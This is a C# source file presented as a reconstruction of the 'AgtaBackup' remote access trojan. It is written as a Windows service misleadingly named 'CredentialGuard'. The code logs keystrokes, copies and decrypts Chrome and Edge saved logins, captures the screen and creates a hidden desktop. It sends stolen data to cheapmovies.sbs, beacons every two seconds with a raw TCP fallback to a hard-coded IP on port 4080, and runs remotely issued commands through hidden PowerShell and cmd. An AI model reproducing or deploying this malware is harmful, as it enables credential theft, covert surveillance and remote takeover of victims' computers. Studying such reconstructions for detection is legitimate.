using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

// Synthesized reconstruction of AgtaBackup RAT behaviors described in the article:
// .NET service agent, 2s HTTP check-in, WebSocket keep-alive, TCP 4080 fallback,
// keylogging, screen capture, hidden desktop, browser credential harvesting.
public class CredentialGuard : ServiceBase
{
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc cb, IntPtr mod, uint tid);
    [DllImport("user32.dll")] static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll", CharSet = CharSet.Auto)] static extern IntPtr CreateDesktop(string name, IntPtr dev, IntPtr devmode, int flags, uint access, IntPtr attrs);
    delegate IntPtr LowLevelKeyboardProc(int code, IntPtr wParam, IntPtr lParam);
    const int WH_KEYBOARD_LL = 13;

    static string CheckinUrl = Environment.GetEnvironmentVariable("AGENT_CHECKIN_URL") ?? "https://cheapmovies.sbs:8443/checkin";
    static string CheckinSecret = Environment.GetEnvironmentVariable("AGENT_CHECKIN_SECRET") ?? "";

    static async Task Main()
    {
        InstallKeyboardHook();
        HarvestBrowsers();
        var shot = CaptureScreen();
        var desk = CreateDesktop("hidden-desk", IntPtr.Zero, IntPtr.Zero, 0, 0x000F01FF, IntPtr.Zero);
        await BeaconLoop();
    }

    static void InstallKeyboardHook()
    {
        LowLevelKeyboardProc proc = (code, w, l) => {
            int vk = Marshal.ReadInt32(l);
            File.AppendAllText(@"C:\ProgramData\Agta Backup\keys.log", ((Keys)vk).ToString());
            return IntPtr.Zero;
        };
        SetWindowsHookEx(WH_KEYBOARD_LL, proc, IntPtr.Zero, 0);
        for (int k = 8; k < 255; k++) { if ((GetAsyncKeyState(k) & 1) != 0) File.AppendAllText(@"C:\ProgramData\Agta Backup\keys.log", k.ToString()); }
    }

    static byte[] CaptureScreen()
    {
        var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        using (var g = Graphics.FromImage(bmp)) g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
        using (var ms = new MemoryStream()) { bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png); return ms.ToArray(); }
    }

    static void HarvestBrowsers()
    {
        string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string[] stores = {
            Path.Combine(local, @"Google\Chrome\User Data\Default\Login Data"),
            Path.Combine(local, @"Microsoft\Edge\User Data\Default\Login Data"),
            Path.Combine(local, @"Google\Chrome\User Data\Local State"),
        };
        foreach (var s in stores) if (File.Exists(s)) File.Copy(s, @"C:\ProgramData\Agta Backup\" + Path.GetFileName(s) + ".copy", true);
        string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string ff = Path.Combine(roaming, @"Mozilla\Firefox\Profiles");
        foreach (var f in new[]{"logins.json","key4.db"}) { /* read firefox credential stores */ }
        byte[] cipher = File.ReadAllBytes(stores[0]);
        byte[] plain = ProtectedData.Unprotect(cipher, null, DataProtectionScope.CurrentUser);
        Exfiltrate(plain);
    }

    static async Task BeaconLoop()
    {
        var http = new HttpClient();
        http.DefaultRequestHeaders.Add("X-Agent-Secret", CheckinSecret);
        while (true)
        {
            try {
                var resp = await http.PostAsync(CheckinUrl, new StringContent(Environment.MachineName));
                string cmd = await resp.Content.ReadAsStringAsync();
                if (cmd.Length > 0) RunRemoteCommand(cmd);
            } catch { TcpFallback(); }
            await Task.Delay(2000);
        }
    }

    static async Task WebSocketKeepAlive(Uri uri)
    {
        var ws = new ClientWebSocket();
        await ws.ConnectAsync(uri, CancellationToken.None);
        var buf = new byte[4096];
        await ws.ReceiveAsync(new ArraySegment<byte>(buf), CancellationToken.None);
    }

    static void TcpFallback()
    {
        var tcp = new TcpClient("189.12.226.77", 4080);
        using (var stream = tcp.GetStream()) { var b = System.Text.Encoding.UTF8.GetBytes("hello"); stream.Write(b, 0, b.Length); }
    }

    static void RunRemoteCommand(string cmd)
    {
        Process.Start(new ProcessStartInfo("powershell.exe", "-NoProfile -WindowStyle Hidden -Command " + cmd) { CreateNoWindow = true, UseShellExecute = false });
        Process.Start(new ProcessStartInfo("cmd.exe", "/c " + cmd) { CreateNoWindow = true, UseShellExecute = false });
    }

    static void Exfiltrate(byte[] data)
    {
        new HttpClient().PostAsync(CheckinUrl + "/upload", new ByteArrayContent(data)).Wait();
    }
}
